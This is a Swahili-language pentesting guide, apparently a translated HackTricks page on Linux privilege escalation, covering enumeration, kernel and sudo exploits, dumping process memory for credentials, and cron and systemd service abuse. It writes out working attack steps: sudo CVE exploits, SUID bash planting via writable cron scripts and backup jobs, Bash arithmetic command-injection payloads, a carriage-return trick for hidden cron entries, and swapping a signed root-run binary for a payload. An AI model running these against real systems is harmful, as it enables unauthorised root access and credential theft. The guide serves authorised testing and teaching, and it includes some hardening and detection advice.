# Linux Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

## System Information

### OS info

Hebu tuanze kupata maarifa kuhusu OS inayoendesha
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Ikiwa **una ruhusa za kuandika kwenye folda yoyote ndani ya** kigezo cha `PATH`, unaweza kuweza ku-hijack baadhi ya libraries au binaries:
```bash
echo $PATH
```
### Maelezo ya Env

Je, kuna taarifa muhimu, passwords au API keys katika environment variables?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kagua kernel version na uone kama kuna exploit inayoweza kutumika kufanya privilege escalation
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Unaweza kupata orodha nzuri ya kernel zilizo katika hatari pamoja na **compiled exploits** hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) na [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Tovuti nyingine ambapo unaweza kupata baadhi ya **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Ili kutoa matoleo yote ya kernel yaliyo katika hatari kutoka kwenye tovuti hiyo, unaweza kufanya:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Tools ambazo zinaweza kusaidia kutafuta kernel exploits ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim, huangalia tu exploits za kernel 2.x)

Daima **tafuta kernel version kwenye Google**, huenda kernel version yako imeandikwa kwenye kernel exploit na hivyo utahakikisha kuwa exploit hii ni halali.

Mbinu za ziada za kernel exploitation:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Toleo la Sudo

Kulingana na matoleo ya sudo yenye athari za kiusalama yanayoonekana katika:
```bash
searchsploit sudo
```
Unaweza kuangalia kama toleo la sudo lina udhaifu kwa kutumia grep hii.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo versions kabla ya 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) huruhusu local users wasio na privileges kuongeza privileges zao hadi root kupitia sudo `--chroot` option wakati faili ya `/etc/nsswitch.conf` inatumiwa kutoka kwenye user controlled directory.

Hii hapa ni [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) ya ku-exploit [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) hilo. Kabla ya ku-run exploit, hakikisha kwamba version yako ya `sudo` iko vulnerable na kwamba inasaidia `chroot` feature.

Kwa maelezo zaidi, soma [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) ya awali.

### Sudo host-based rules bypass (CVE-2025-32462)

Sudo kabla ya 1.9.17p1 (affected range iliyoripotiwa: **1.8.8–1.9.17**) inaweza kutathmini host-based sudoers rules kwa kutumia **user-supplied hostname** kutoka `sudo -h <host>` badala ya **real hostname**. Ikiwa sudoers inatoa privileges pana zaidi kwenye host nyingine, unaweza ku-**spoof** host hiyo locally.

Requirements:
- Vulnerable sudo version
- Host-specific sudoers rules (host si current hostname wala `ALL`)

Mfano wa sudoers pattern:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Exploit kwa spoofing host iliyoruhusiwa:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Ikiwa utatuzi wa jina lililofanyiwa spoofing unakwama, liongeze kwenye `/etc/hosts` au tumia hostname ambayo tayari inaonekana kwenye logs/configs ili kuepuka DNS lookups.

#### sudo < v1.8.28

Kutoka kwa @sickrov
```
sudo -u#-1 /bin/bash
```
### Uthibitishaji wa sahihi wa Dmesg umeshindwa

Kagua **smasher2 box of HTB** kwa **mfano** wa jinsi vuln hii inaweza kutumiwa
```bash
dmesg 2>/dev/null | grep "signature"
```
### Uchunguzi zaidi wa mfumo
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Orodhesha ulinzi unaowezekana

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

If you are inside a container, anza na sehemu ifuatayo ya container-security kisha pivot kwenda kwenye kurasa za runtime-specific abuse:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Drives

Kagua **kilichomountiwa na ku-unmountiwa**, wapi na kwa nini. Ikiwa kuna kitu kilicho-unmountiwa, unaweza kujaribu kukimount na kukagua taarifa za siri
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Programu muhimu

Orodhesha binaries muhimu
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Pia, angalia kama **compiler yoyote imewekwa**. Hii ni muhimu ikiwa unahitaji kutumia kernel exploit, kwa kuwa inashauriwa kuikompile kwenye machine utakakayotumia (au machine inayofanana nayo).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software Yenye Udhaifu Iliyosakinishwa

Kagua **toleo la vifurushi na huduma zilizosakinishwa**. Huenda kuna toleo la zamani la Nagios, kwa mfano, ambalo linaweza kutumiwa kwa exploit ya escalating privileges…\
Inapendekezwa kukagua mwenyewe toleo la software iliyosakinishwa inayotia shaka zaidi.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ikiwa una ufikiaji wa SSH kwenye mashine, unaweza pia kutumia **openVAS** kuangalia programu zilizowekwa ndani ya mashine ambazo zimepitwa na wakati na zina udhaifu.

> [!NOTE] > _Kumbuka kwamba commands hizi zitaonyesha taarifa nyingi ambazo kwa sehemu kubwa hazitakuwa na manufaa, kwa hivyo inapendekezwa kutumia baadhi ya applications kama OpenVAS au zinazofanana nayo, ambazo zitaangalia ikiwa toleo la programu yoyote iliyowekwa linaweza kuathiriwa na exploits zinazojulikana_

## Processes

Angalia **processes gani** zinatekelezwa na uhakikishe ikiwa process yoyote ina **privileges zaidi kuliko inavyopaswa** (labda tomcat inayotekelezwa na root?)
```bash
ps aux
ps -ef
top -n 1
```
Kila mara chunguza kama kuna [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md) zinazoendesha, unaweza kuzitumia vibaya kuongeza privileges. **Linpeas** hutambua hizo kwa kuangalia parameter ya `--inspect` ndani ya command line ya process.\
Pia **chunguza privileges zako juu ya binaries za processes**, huenda ukaweza kubatilisha binary ya mtu mwingine.

### Minyororo ya parent-child kati ya watumiaji tofauti

Process ya child inayoendesha chini ya **user tofauti** na parent wake si lazima iwe malicious, lakini ni **triage signal** muhimu. Baadhi ya mabadiliko yanatarajiwa (`root` kuanzisha service user, login managers kuunda session processes), lakini minyororo isiyo ya kawaida inaweza kufichua wrappers, debug helpers, persistence, au mipaka dhaifu ya runtime trust.

Mapitio ya haraka:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Ukipata chain ya kushangaza, kagua command line ya parent na faili zote zinazoathiri tabia yake (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments). Katika njia kadhaa halisi za privesc, child yenyewe haikuwa writable, lakini **config inayodhibitiwa na parent** au chain ya helper ndiyo iliyokuwa writable.

### Executables zilizofutwa na faili zilizofutwa lakini zikiwa wazi

Runtime artifacts mara nyingi bado zinaweza kufikiwa **baada ya kufutwa**. Hii ni muhimu kwa privilege escalation na pia kwa kurejesha ushahidi kutoka kwa process ambayo tayari ina faili nyeti zilizo wazi.

Kagua executables zilizofutwa:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Ikiwa `/proc/<PID>/exe` inaelekeza kwenye `(deleted)`, process bado inaendesha image ya binary ya zamani kutoka kwenye memory. Hii ni signal muhimu ya kuchunguza kwa sababu:

- executable iliyoondolewa inaweza kuwa na strings au credentials za kuvutia
- process inayoendelea ku-run bado inaweza kufichua file descriptors zenye manufaa
- binary ya privileged iliyoondolewa inaweza kuashiria tampering ya hivi karibuni au jaribio la cleanup

Kusanya faili za deleted-open kwa ujumla:
```bash
lsof +L1
```
Ukipata descriptor ya kuvutia, irejeshe moja kwa moja:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Hii ni muhimu hasa wakati mchakato bado umefungua secret, script, database export, au flag file iliyofutwa.

### Ufuatiliaji wa michakato

Unaweza kutumia tools kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia michakato. Hii inaweza kuwa muhimu sana kutambua michakato iliyo hatarini inayotekelezwa mara kwa mara au wakati seti fulani ya mahitaji imetimizwa.

### Kumbukumbu ya mchakato

Baadhi ya services za server huhifadhi **credentials katika maandishi wazi ndani ya memory**.\
Kwa kawaida utahitaji **root privileges** ili kusoma memory ya michakato inayomilikiwa na users wengine; kwa hiyo hii huwa muhimu zaidi unapokuwa tayari root na unataka kugundua credentials zaidi.\
Hata hivyo, kumbuka kwamba **kama regular user unaweza kusoma memory ya michakato unayomiliki**.

> [!WARNING]
> Kumbuka kwamba siku hizi machines nyingi **haziruhusu ptrace kwa default**, jambo linalomaanisha kuwa huwezi kudump michakato mingine inayomilikiwa na unprivileged user wako.
>
> File _**/proc/sys/kernel/yama/ptrace_scope**_ hudhibiti accessibility ya ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: michakato yote inaweza kufanyiwa debugging, mradi iwe na uid sawa. Hii ndiyo njia ya kawaida ambayo ptracing ilivyofanya kazi.
> - **kernel.yama.ptrace_scope = 1**: ni mchakato parent pekee unaoweza kufanyiwa debugging.
> - **kernel.yama.ptrace_scope = 2**: Ni admin pekee anayeweza kutumia ptrace, kwa kuwa inahitaji capability ya CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Hakuna michakato inayoweza kufuatiliwa kwa ptrace. Ikishawekwa, reboot inahitajika ili kuwezesha ptracing tena.

#### GDB

Ikiwa una access kwa memory ya FTP service (kwa mfano), unaweza kupata Heap na kutafuta credentials ndani yake.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Kwa process ID fulani, **maps huonyesha jinsi memory inavyomap ndani ya** virtual address space ya process hiyo; pia huonyesha **permissions za kila region iliyomap**. **mem** pseudo file **hufichua memory yenyewe ya process**. Kutoka kwenye **maps** file tunajua ni **memory regions zipi zinazoweza kusomeka** na offsets zake. Tunatumia taarifa hii **kuseek ndani ya mem file na kudump regions zote zinazoweza kusomeka** kwenye file.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` hutoa ufikiaji wa **kumbukumbu halisi** ya mfumo, si kumbukumbu pepe. Nafasi ya anwani pepe ya kernel inaweza kufikiwa kwa kutumia /dev/kmem.\
Kwa kawaida, `/dev/mem` inaweza kusomeka tu na **root** na kundi la **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump ya Linux

ProcDump ni toleo la Linux la zana ya kawaida ya ProcDump kutoka kwenye mkusanyiko wa zana za Sysinternals za Windows. Ipate kwenye [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Zana

Ili kudump memory ya process unaweza kutumia:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kuondoa mahitaji ya root manually na kudump process inayomilikiwa na wewe
- Script A.5 kutoka [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)

### Credentials kutoka Process Memory

#### Mfano wa Manual

Ukigundua kuwa authenticator process inaendelea:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Unaweza kufanya dump ya process (angalia sehemu zilizotangulia ili kupata njia tofauti za kufanya dump ya memory ya process) na kutafuta credentials ndani ya memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **itaiba credentials za maandishi wazi kutoka kwenye memory** na kutoka kwenye **faili fulani zinazojulikana**. Inahitaji root privileges ili ifanye kazi ipasavyo.

| Kipengele                                         | Jina la Process       |
| ------------------------------------------------- | --------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Ikiwa paneli ya wavuti ya “Crontab UI” (alseambusher/crontab-ui) inaendeshwa kama root na imefungwa kwenye loopback pekee, bado unaweza kuifikia kupitia SSH local port-forwarding na kuunda job yenye privileged ili kufanya escalation.

Typical chain
- Tambua port inayopatikana kwenye loopback pekee (kwa mfano, 127.0.0.1:8000) na Basic-Auth realm kupitia `ss -ntlp` / `curl -v localhost:8000`
- Tafuta credentials kwenye operational artifacts:
- Backups/scripts zenye `zip -P <password>`
- systemd unit inayoonyesha `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tengeneza tunnel na uingie:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Unda kazi yenye privileges za juu na uiendeshe mara moja (huweka SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Itumie:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Usiendeshe Crontab UI kama root; iweke chini ya user maalum na ruhusa za kiwango cha chini
- Ifunge kwenye localhost na pia zuia ufikiaji kupitia firewall/VPN; usitumie tena passwords
- Epuka kuweka secrets ndani ya unit files; tumia secret stores au EnvironmentFile yenye ufikiaji wa root pekee
- Wezesha audit/logging kwa utekelezaji wa jobs unaoombwa



Kagua kama kuna scheduled job yoyote iliyo vulnerable. Labda unaweza kutumia fursa ya script inayotekelezwa na root (wildcard vuln? unaweza kurekebisha files ambazo root hutumia? kutumia symlinks? kuunda files maalum kwenye directory ambayo root hutumia?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Ikiwa `run-parts` inatumika, angalia ni majina yapi yatatekelezwa kwa kweli:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Hii huepusha false positives. Directory ya periodic inayoweza kuandikwa huwa na manufaa tu ikiwa jina la faili yako ya payload linalingana na sheria za ndani za `run-parts`.

### Cron path

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Zingatia jinsi mtumiaji "user" alivyo na ruhusa za kuandika katika /home/user_)

Ikiwa ndani ya crontab hii mtumiaji root anajaribu kutekeleza command au script bila kuweka path. Kwa mfano: _\* \* \* \* root overwrite.sh_\
Basi unaweza kupata root shell kwa kutumia:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron kwa kutumia script yenye wildcard (Wildcard Injection)

Ikiwa script inatekelezwa na root na ina “**\***” ndani ya command, unaweza kutumia hali hii kusababisha mambo yasiyotarajiwa (kama privesc). Mfano:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ikiwa wildcard imetanguliwa na path kama** _**/some/path/\***_ **, si vulnerable (hata** _**./\***_ **si).**

Soma ukurasa ufuatao kwa tricks zaidi za wildcard exploitation:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection katika cron log parsers

Bash hufanya parameter expansion na command substitution kabla ya arithmetic evaluation katika ((...)), $((...)) na let. Ikiwa root cron/parser inasoma log fields zisizoaminika na kuziingiza katika arithmetic context, attacker anaweza kuingiza command substitution $(...) ambayo hu-execute kama root wakati cron ina-run.

- Kwa nini inafanya kazi: Katika Bash, expansions hufanyika kwa mpangilio huu: parameter/variable expansion, command substitution, arithmetic expansion, kisha word splitting na pathname expansion. Kwa hivyo value kama `$(/bin/bash -c 'id > /tmp/pwn')0` kwanza inasubstitutiwa (na command ina-run), kisha numeric `0` iliyobaki inatumika kwa arithmetic ili script iendelee bila errors.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Fanya attacker-controlled text iandikwe kwenye parsed log ili numeric-looking field iwe na command substitution na imalizike kwa digit. Hakikisha command yako haichapishi kwenye stdout (au u-redirect) ili arithmetic ibaki valid.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting na symlink

Ikiwa **unaweza kurekebisha cron script** inayotekelezwa na root, unaweza kupata shell kwa urahisi:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ikiwa script inayotekelezwa na root inatumia **directory ambayo una full access nayo**, huenda ikawa muhimu kufuta folder hilo na **kuunda symlink folder inayoelekeza kwenye nyingine** inayotumikia script inayodhibitiwa na wewe.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Uthibitishaji wa Symlink na ushughulikiaji salama wa faili

Unapokagua scripts/binaries zenye privileged access ambazo husoma au kuandika faili kwa kutumia path, thibitisha jinsi links zinavyoshughulikiwa:

- `stat()` hufuata symlink na kurudisha metadata ya target.
- `lstat()` hurudisha metadata ya link yenyewe.
- `readlink -f` na `namei -l` husaidia kutatua target ya mwisho na kuonyesha permissions za kila kipengele cha path.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Kwa defenders/developers, patterns salama zaidi dhidi ya mbinu za symlink ni pamoja na:

- `O_EXCL` pamoja na `O_CREAT`: inashindwa ikiwa path tayari ipo (huzuia links/files zilizoundwa mapema na attacker).
- `openat()`: hufanya kazi relative to trusted directory file descriptor.
- `mkstemp()`: huunda temporary files atomically kwa permissions salama.

### Cron binaries zilizotiwa saini maalum zenye payloads zinazoweza kuandikwa

Blue teams wakati mwingine "husaini" cron-driven binaries kwa kutoa custom ELF section na kutumia grep kutafuta vendor string kabla ya kuzitekeleza kama root. Ikiwa binary hiyo inaweza kuandikwa na group (kwa mfano, `/opt/AV/periodic-checks/monitor` inayomilikiwa na `root:devs 770`) na unaweza kupata leak ya signing material, unaweza kutengeneza upya section hiyo na hijack cron task:

1. Tumia `pspy` kunasa verification flow. Katika Era, root aliendesha `objcopy --dump-section .text_sig=text_sig_section.bin monitor` ikifuatiwa na `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`, kisha aka-execute file.
2. Tengeneza upya certificate inayotarajiwa ukitumia leaked key/config (kutoka `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Tengeneza replacement yenye malicious payload (kwa mfano, drop SUID bash, ongeza SSH key yako) na embed certificate ndani ya `.text_sig` ili grep ipite:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Overwrite scheduled binary huku ukihifadhi execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Subiri cron run inayofuata; mara tu naive signature check inapofaulu, payload yako ita-run kama root.

### Cron jobs zinazotokea mara kwa mara

Unaweza ku-monitor processes ili kutafuta processes zinazo-execute kila dakika 1, 2 au 5. Huenda ukaweza kutumia fursa hiyo na ku-escalate privileges.

Kwa mfano, ili **ku-monitor kila 0.1s kwa muda wa dakika 1**, **kupanga kwa kuanzia commands zilizo-execute mara chache zaidi** na ku-delete commands ambazo zime-execute mara nyingi zaidi, unaweza kufanya:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itafuatilia na kuorodhesha kila process inayoanza).

### Root backups zinazohifadhi mode bits zilizowekwa na attacker (pg_basebackup)

Ikiwa cron inayoendeshwa na root inatumia `pg_basebackup` (au recursive copy yoyote) dhidi ya directory ya database unayoweza kuandika, unaweza kuweka **SUID/SGID binary** ambayo itanakiliwa tena kama **root:root** ikiwa na mode bits zilezile kwenye backup output.

Mtiririko wa kawaida wa discovery (kama low-priv DB user):
- Tumia `pspy` kubaini root cron inayoita kitu kama `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` kila dakika.
- Thibitisha kuwa source cluster (kwa mfano, `/var/lib/postgresql/14/main`) unaweza kuiandikia na destination (`/opt/backups/current`) inakuwa ya root baada ya job.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Hii hufanya kazi kwa sababu `pg_basebackup` huhifadhi bits za mode za faili inap nakili cluster; inapoendeshwa na root, faili za lengwa hurithi **umiliki wa root + SUID/SGID zilizochaguliwa na attacker**. Utaratibu wowote sawa wa backup/copy wenye privileges unaohifadhi permissions na kuandika katika eneo linaloweza ku-execute unaweza kuwa vulnerable.

### Invisible cron jobs

Inawezekana kuunda cronjob **kwa kuweka carriage return baada ya comment** (bila newline character), na cron job itafanya kazi. Mfano (zingatia carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Ili kugundua ingizo hili fiche, kagua faili za cron kwa kutumia zana zinazoonyesha vibambo vya udhibiti:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Huduma

### Faili za _.service_ zinazoweza kuandikwa

Kagua kama unaweza kuandika faili yoyote `.service`; ukiweza, **unaweza kuibadilisha** ili **itekeleze** **backdoor** yako **wakati** huduma **inapoanzishwa**, **inapoanzishwa upya** au **inaposimamishwa** (huenda utahitaji kusubiri hadi mashine iwashe upya).\
Kwa mfano, tengeneza backdoor yako ndani ya faili ya .service kwa **`ExecStart=/tmp/script.sh`**

### Binaries za huduma zinazoweza kuandikwa

Kumbuka kwamba ikiwa una **ruhusa za kuandika kwenye binaries zinazotekelezwa na huduma**, unaweza kuzibadilisha ziwe backdoors ili huduma zitakapotekelezwa tena, backdoors zitekelezwe.

### systemd PATH - Relative Paths

Unaweza kuona PATH inayotumiwa na **systemd** kwa:
```bash
systemctl show-environment
```
Ukigundua kuwa unaweza **write** katika folda yoyote ya path, huenda ukaweza **escalate privileges**. Unahitaji kutafuta **relative paths being used on service configurations** files kama vile:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Kisha, tengeneza **executable** yenye **jina sawa na binary ya relative path** ndani ya systemd PATH folder ambayo unaweza kuandikia, na service inapoombwa kutekeleza kitendo chenye vulnerability (**Start**, **Stop**, **Reload**), **backdoor** yako itatekelezwa (watumiaji wasio na privileges kwa kawaida hawawezi kuanzisha/kusimamisha services, lakini angalia kama unaweza kutumia `sudo -l`).

**Jifunze zaidi kuhusu services kwa `man systemd.service`.**

## **Timers**

**Timers** ni systemd unit files ambazo majina yake yanaishia na `**.timer**` na hudhibiti files za `**.service**` au events. **Timers** zinaweza kutumika kama mbadala wa cron kwa kuwa zina support iliyojengwa ndani kwa calendar time events na monotonic time events, na zinaweza kuendeshwa asynchronously.

Unaweza kuorodhesha timers zote kwa:
```bash
systemctl list-timers --all
```
